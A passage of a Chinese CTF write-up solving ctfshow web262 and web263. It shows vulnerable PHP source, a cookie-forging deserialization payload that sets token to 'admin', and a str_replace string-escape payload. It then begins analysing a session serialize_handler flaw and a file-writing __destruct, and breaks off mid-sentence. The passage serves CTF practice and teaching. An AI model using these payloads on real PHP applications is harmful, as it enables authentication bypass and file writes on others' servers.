class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>​文档注释给了信息，有一个 message.php 文件，访问下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​有两个方法，这里先用</p><p>​<strong>直接反序列化：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>​直接通过 cookie 传一个 msg 上去即可得到 flag</p><p>​<strong>字符串逃逸:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$m</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$t</span> = <span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line"><span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span> ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#palyoad:f=1&amp;m=1&amp;t=1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web263"><a class="markdownIt-Anchor" href="#web263">#</a> web263:</h1><p>​一上来是个登录框，听说考点是 session 反序列化，先贴一个文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vR1RMLUpVL3AvMTY4NTkwOTguaHRtbA==">session 反序列化</span></p><p>​首先，访问 www.zip 获取源码。</p><p>​index.php：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-03 16:28:37</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-06 19:21:45</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">//超过5次禁止登陆</span><br><span class="line">if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"> setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line"> $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1,maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;</span><br><span class="line">&lt;title&gt;ctfshow登陆&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;pc-kk-form&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;CTFshow 登陆&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class="line">&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">&lt;input id=&quot;u&quot; type=&quot;text&quot; placeholder=&quot;用户名&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">&lt;input id=&quot;pass&quot; type=&quot;password&quot; placeholder=&quot;密码&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;pc-kk-form-btn&quot;&gt;</span><br><span class="line">&lt;button onclick=&quot;check();&quot;&gt;登陆&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">function check()&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:&#x27;check.php&#x27;,</span><br><span class="line">type: &#x27;GET&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class="line">&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class="line">&#125;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">alert(JSON.parse(data).msg);</span><br><span class="line">&#125;,</span><br><span class="line">error:function(data)&#123;</span><br><span class="line">alert(JSON.parse(data).msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​index.php 里主要的 php 逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//超过5次禁止登陆</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;limit&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line"> <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​check.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>= <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">[<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">],[</span><br><span class="line"><span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line"><span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line"><span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] //密码必须为<span class="number">128</span>位大小写字母+数字+特殊符号，防止爆破</span><br><span class="line">]</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line"><span class="comment">//登陆成功取消次数累计</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;欢迎您&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//登陆失败累计次数加1</span></span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;登陆失败&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​inc/inc.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">use</span> \<span class="title">CTFSHOW</span>\<span class="title">CTFSHOW</span>; </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>([</span><br><span class="line">    <span class="string">&#x27;database_type&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;option&#x27;</span> =&gt; [</span><br><span class="line">        PDO::<span class="variable constant_">ATTR_CASE</span> =&gt; PDO::<span class="variable constant_">CASE_NATURAL</span></span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sql注入检查</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;log-&quot;</span>.<span class="variable">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="variable">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="variable">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.<span class="title function_ invoke__">date_create</span>()-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*生成唯一标志</span></span><br><span class="line"><span class="comment">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . <span class="title function_ invoke__">substr</span> ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>​最后一个文件没啥用，又长，就不放了。</p><p>​先看 inc/inc.php，里面存在 <code>ini_set('session.serialize_handler', 'php');</code> ，根据 user 类，发现可以写入文件，发现在魔术方法__destruct 